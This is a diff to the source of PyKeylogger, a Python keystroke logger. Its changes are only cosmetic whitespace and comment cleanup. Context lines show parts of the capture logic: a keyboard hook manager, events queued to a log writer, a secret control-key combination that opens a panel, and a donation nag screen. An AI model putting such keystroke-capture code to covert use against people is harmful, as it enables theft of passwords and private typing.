@@ -57,8 +57,7 @@ class KeyLogger:
        class.
        
        '''
-    def __init__(self): 
-        
+    def __init__(self):
         self.ParseOptions() # stored in self.cmdoptions
         self.ParseConfigFile() # stored in self.settings
         self.ParseControlKey()
@@ -77,7 +76,6 @@ class KeyLogger:
                                                  self.lw,
                                                  self,
                                                  self.ControlKeyHash)
-        
         self.hm = hooklib.HookManager()
         
         if self.settings['General']['Hook Keyboard'] == True:
@@ -112,7 +110,6 @@ class KeyLogger:
            file before doing anything.
            
            '''
-        
         if os.path.isabs(self.settings['General']['Log Directory']):
             self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
         else:
@@ -134,7 +131,6 @@ class KeyLogger:
            and passes the event on to the system.
            
            '''
-        
         self.q_logwriter.put(event)
         
         self.ControlKeyHash.update(event)
@@ -142,20 +138,19 @@ class KeyLogger:
         if self.cmdoptions.debug:
                 self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
                 
-        # have to open the panel from main thread on windows, otherwise it hangs.
-        # possibly due to some interaction with the python message pump and tkinter?
-        # 
-        # on linux, on the other hand, doing it from a separate worker thread is a must
-        # since the pyxhook module blocks until panel is closed, so we do it with the 
-        # hashchecker thread instead.
-        if os.name == 'nt': 
+        # We have to open the panel from main thread on windows, otherwise it
+        # hangs. This is possibly due to some interaction with the python
+        # message pump and tkinter.
+        # On linux, on the other hand, doing it from a separate worker thread
+        # is a must since the pyxhook module blocks until panel is closed,
+        # so we do it with the hashchecker thread instead.
+        if os.name == 'nt':
             if self.ControlKeyHash.check():
                 if not self.panel:
                     self.lw.PrintDebug("starting panel")
                     self.panel = True
                     self.ControlKeyHash.reset()
                     PyKeyloggerControlPanel(self.cmdoptions, self)
-        
         return True
     
     def OnKeyUpEvent(self,event):
@@ -168,7 +163,6 @@ class KeyLogger:
     
     def stop(self):
         '''Exit cleanly.'''
-        
         if os.name == 'posix':
             self.hm.cancel()
             self.hashchecker.cancel()
@@ -185,8 +179,8 @@ class KeyLogger:
         parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
         parser.add_option("-v", "--configval", action="store", dest="configval", help="filename of the configuration validation file. [default: %default]")
         
-        parser.set_defaults(debug=False, 
-                            configfile=version.name + ".ini", 
+        parser.set_defaults(debug=False,
+                            configfile=version.name + ".ini",
                             configval=version.name + ".val")
         
         (self.cmdoptions, args) = parser.parse_args()
@@ -229,11 +223,12 @@ class KeyLogger:
     def NagscreenLogic(self):
         '''Show the nagscreen (or not).'''
         
-        # Congratulations, you have found the nag control. See, that wasn't so hard, was it? :)
-        # 
-        # While I have deliberately made it easy to stop all this nagging and expiration stuff here,
-        # and you are quite entitled to doing just that, I would like to take this final moment 
-        # and encourage you once more to support the PyKeylogger project by making a donation. 
+        # Congratulations, you have found the nag control.
+        # See, that wasn't so hard, was it? :)
+        # While I have deliberately made it easy to stop all this nagging and
+        # expiration stuff here, and you are quite entitled to doing just that,
+        # I would like to take this final moment and encourage you once more to
+        # support the PyKeylogger project by making a donation.
         
         # Set this to False to get rid of all nagging.
         NagMe = True
@@ -292,12 +287,12 @@ class ControlKeyHash:
         
         self.controlKeyList = controlkeysetting.split(';')
         
-        # capitalize all items for greater tolerance of variant user inputs
+        # Capitalize all items for greater tolerance of variant user inputs.
         self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
-        # remove duplicates
+        # Remove duplicates.
         self.controlKeyList = list(set(self.controlKeyList))
         
-        # translate linux versions of key names to windows, or vice versa,
+        # Translate linux versions of key names to windows, or vice versa,
         # depending on what platform we are on.
         if os.name == 'nt':
             for item in self.controlKeyList:
@@ -364,8 +359,8 @@ class ControlKeyMonitor(threading.Thread):
         
 
 if __name__ == '__main__':
-    
     kl = KeyLogger()
     kl.start()
     
-    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
+    # If you want to change keylogger behavior from defaults,
+    # modify the .ini file. Also try '-h' for list of command line options.
